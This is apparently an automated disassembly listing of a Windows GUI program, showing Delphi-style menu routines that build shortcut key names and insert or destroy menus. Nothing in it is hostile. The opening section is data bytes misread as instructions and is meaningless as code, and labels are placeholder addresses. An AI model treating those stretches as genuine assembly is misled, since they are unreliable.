imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
cdq
inc esp
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
outsb
je r-xdata
ja r-xdata
add [ edi ] al
add [ eax - 0x1d ] dh
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffee900041 ]
inc esp
add [ edx - 0x24ffffbc ] bh
inc esp
add ah ch
loop r-xdata
je r-xdata
or eax 0x6f42616d
insd
jo r-xdata
je r-xdata
inc esp
add [ eax ] bh
inc edi
inc ecx
add al cl
popfd
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
add [ ecx + esi + 0x40 ] cl
add [ edi + ebp * 8 ] al
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
cwde
inc esp
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
cld
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] bh
out dx eax
inc esp
add al dh
out dx eax
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7800449a ] dl
add [ eax ] al
add [ eax ] ch
xchg esi eax
inc esp
add al al
mov eax [ 0x33ec0041 ]
inc eax
outsd
inc edx
outsd
je r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + ebx * 4 ] bh
inc esp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add al 0x0
add [ eax ] al
outsb
jne r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax - 0x3fffbb19 ] dh
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
call 0x644de82
je r-xdata
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + eax ] al
0x96dc0044 0x44
adc [ eax ] al
add eax 0x756e654d
jae r-xdata
jns r-xdata
add [ eax - 0x5fffbb19 ] dl
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
jo r-xdata
cdq
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jne r-xdata
cdq
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
inc ecx
add ah dh
xor eax [ eax ]
call 0x3044da74
xor [ eax ] eax
dec esp
xor [ eax ] eax
add al 0xef
xor eax [ eax ]
adc al 0x9b
add [ ebp - 0x65b3ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ ecx + ebx * 4 + 0x44 ] edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x449a ] ah
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
clc
loope r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add al 0x91
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
cwde
inc esp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
push ss
inc ecx
add [ edi + ebp * 8 + 0x44 ] cl
add [ edi + ebp * 8 + 0x44 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
pushfd
add al 0x91
inc esp
add [ ebx + ebx * 4 ] dl
shl [ ecx + 0x33ec0041 ] 0x40
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
mov al [ 0x700449a ]
outsb
add eax 0x756e654d
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
[ edi ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
adc eax 0x300041
add bh bh
sbb bh ah
inc esp
add [ eax ] dl
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x800449d
add [ eax ] al
add ah ch
inc ebx
inc edx
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
cdq
inc ebx
push 0x65676e61
or [ edi ] dl
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
xor eax [ eax ]
add [ esp + ebx + 0x33e00041 ] cl
inc eax
add ah ch
outsb
adc [ edi + 0x500044 ] cl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
je r-xdata
add al ah
xor eax [ eax ]
in al dx
shl al 0x9c
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx * 4 + 0x140044 ] al
add [ eax ] al
mov [ ecx + eax * 2 ] ds
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add bh bh
xor al 0xe3
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
cdq
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
sub_449da8
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_438de8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43e644
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_449e00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_449e38
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403ee8
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404158
sub_449e8c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44a075
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f80
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_4040d0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f80
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f80
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_4040d0
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_4040d0
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403ee8
mov eax esi
call sub_403ee8
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f80
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407f38
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041f4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_449e38
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041b0
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f80
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041b0
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4041b0
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a07c
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f0c
retn
sub_44a090
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4041a8
push eax
mov eax edi
call sub_4041a8
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4041a8
push eax
mov eax edi
call sub_4043a8
push eax
mov eax [ esi ]
call sub_4043a8
pop edx
pop ecx
call sub_407e18
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4041a8
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404448
sub_44a0ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404398
xor eax eax
push ebp
push sub_44a1c7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44a090
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44a090
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44a090
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44a090
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a1ce
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_449e8c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407dc8
test eax eax
jne r-xdata
sub_44a204
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_44c7a4
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_44c7b4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44a264
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_44c7a4
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44c7a4
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44c7b4
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44c7b4
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44a204
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_44a204
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44c7b4
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44c7b4
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44a3b0
push ebx
mov ebx eax
mov eax ebx
call sub_446aa0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_44f2c0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44a3e8
push ebx
mov ebx eax
mov eax ebx
call sub_446ab4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a418
push ebx
mov ebx eax
mov eax ebx
call sub_446ac8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a448
push ebx
mov ebx eax
mov eax ebx
call sub_446af0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a478
push ebx
mov ebx eax
mov eax ebx
call sub_446b18
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4042f4
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a4ac
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_446adc
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a4e8
push ebx
mov ebx eax
mov eax ebx
call sub_446b2c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a51c
push ebx
mov ebx eax
mov eax ebx
call sub_446b40
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a550
push ebx
mov ebx eax
mov eax ebx
call sub_446b54
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a584
push ebx
mov ebx eax
mov eax ebx
call sub_41a340
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a5ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44a5cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44c60c
sub_44a5ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44c67c
sub_44a60c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44c6d0
sub_44a62c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_44a648
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403f3c
sub_44a66c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44c7fc
sub_44a68c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44c7d8
sub_44a6ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44c7ec
sub_44a6cc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44a6f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a50
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44a1e4
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44d108
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_44a774
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44f0a4
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_44c7a4
test eax eax
jg r-xdata
mov edx esi
call sub_44cb3c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_44c7b4
call sub_403198
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403198
lea eax [ esi + 0x44 ]
call sub_40d3ac
lea eax [ esi + 0x78 ]
call sub_40d3ac
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_44ab90
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41456c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a9c
test bl bl
jle r-xdata
call sub_403198
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_44a828
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44aa83
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44aa8a
lea eax [ ebp - 0x40 ]
call sub_403ee8
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403f80
mov eax ebx
call sub_44c7a4
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_44ad38
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042f4
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_44c7a4
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_44cd60
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_449e8c
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404268
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043a8
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4043a8
push eax
mov eax ebx
call sub_44ad38
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403324
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_44c37c
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042f4
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
